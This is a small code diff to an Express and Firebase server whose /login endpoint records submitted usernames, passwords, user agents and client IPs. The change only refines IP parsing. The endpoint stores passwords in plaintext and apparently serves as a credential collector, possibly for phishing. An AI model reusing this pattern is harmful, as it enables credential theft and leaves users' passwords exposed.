@@ -23,11 +23,12 @@ const db = admin.database();
 // 📡 Login data receive panna
 app.post("/login", (req, res) => {
   const data = req.body;
-
+const rawIP=req.headers['x-forwarded-for']||req.ip;
+  const ip=rawIP.split(",")[0].trim();
   const ref = db.ref("loginAttempts").push();
   ref.set({
     time: new Date().toLocaleString(),
-   ip:req.headers['x-forwarded-for']|| req.ip,
+   ip:ip,
     username: data.username || "N/A",
     password: data.password || "N/A",
     userAgent: data.agent || "N/A",
